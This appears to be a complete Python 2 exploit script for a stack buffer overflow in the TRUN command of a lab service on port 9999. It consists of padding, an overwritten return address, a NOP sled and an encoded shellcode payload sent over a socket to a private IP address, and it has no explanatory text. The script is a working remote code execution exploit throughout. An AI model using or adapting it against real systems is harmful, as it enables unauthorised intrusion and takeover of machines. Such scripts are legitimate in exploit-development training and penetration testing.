#!/usr/bin/python
import sys, socket

overflow =("\xba\xb2\x11\x78\x74\xd9\xc2\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x52\x31\x56\x12\x03\x56\x12\x83\x5c\xed\x9a\x81\x5c\xe6\xd9"
"\x6a\x9c\xf7\xbd\xe3\x79\xc6\xfd\x90\x0a\x79\xce\xd3\x5e\x76"
"\xa5\xb6\x4a\x0d\xcb\x1e\x7d\xa6\x66\x79\xb0\x37\xda\xb9\xd3"
"\xbb\x21\xee\x33\x85\xe9\xe3\x32\xc2\x14\x09\x66\x9b\x53\xbc"
"\x96\xa8\x2e\x7d\x1d\xe2\xbf\x05\xc2\xb3\xbe\x24\x55\xcf\x98"
"\xe6\x54\x1c\x91\xae\x4e\x41\x9c\x79\xe5\xb1\x6a\x78\x2f\x88"
"\x93\xd7\x0e\x24\x66\x29\x57\x83\x99\x5c\xa1\xf7\x24\x67\x76"
"\x85\xf2\xe2\x6c\x2d\x70\x54\x48\xcf\x55\x03\x1b\xc3\x12\x47"
"\x43\xc0\xa5\x84\xf8\xfc\x2e\x2b\x2e\x75\x74\x08\xea\xdd\x2e"
"\x31\xab\xbb\x81\x4e\xab\x63\x7d\xeb\xa0\x8e\x6a\x86\xeb\xc6"
"\x5f\xab\x13\x17\xc8\xbc\x60\x25\x57\x17\xee\x05\x10\xb1\xe9"
"\x6a\x0b\x05\x65\x95\xb4\x76\xac\x52\xe0\x26\xc6\x73\x89\xac"
"\x16\x7b\x5c\x62\x46\xd3\x0f\xc3\x36\x93\xff\xab\x5c\x1c\xdf"
"\xcc\x5f\xf6\x48\x66\x9a\x91\xb6\xdf\x7e\xe8\x5f\x22\x7e\xfa"
"\xc3\xab\x98\x96\xeb\xfd\x33\x0f\x95\xa7\xcf\xae\x5a\x72\xaa"
"\xf1\xd1\x71\x4b\xbf\x11\xff\x5f\x28\xd2\x4a\x3d\xff\xed\x60"
"\x29\x63\x7f\xef\xa9\xea\x9c\xb8\xfe\xbb\x53\xb1\x6a\x56\xcd"
"\x6b\x88\xab\x8b\x54\x08\x70\x68\x5a\x91\xf5\xd4\x78\x81\xc3"
"\xd5\xc4\xf5\x9b\x83\x92\xa3\x5d\x7a\x55\x1d\x34\xd1\x3f\xc9"
"\xc1\x19\x80\x8f\xcd\x77\x76\x6f\x7f\x2e\xcf\x90\xb0\xa6\xc7"
"\xe9\xac\x56\x27\x20\x75\x76\xca\xe0\x80\x1f\x53\x61\x29\x42"
"\x64\x5c\x6e\x7b\xe7\x54\x0f\x78\xf7\x1d\x0a\xc4\xbf\xce\x66"
"\x55\x2a\xf0\xd5\x56\x7f")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try: 
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('192.168.218.141',9999))
		s.send(('TRUN /.:/' + shellcode))
		s.close()
		

except:
		print "Error connecting to server" 
		sys.exit()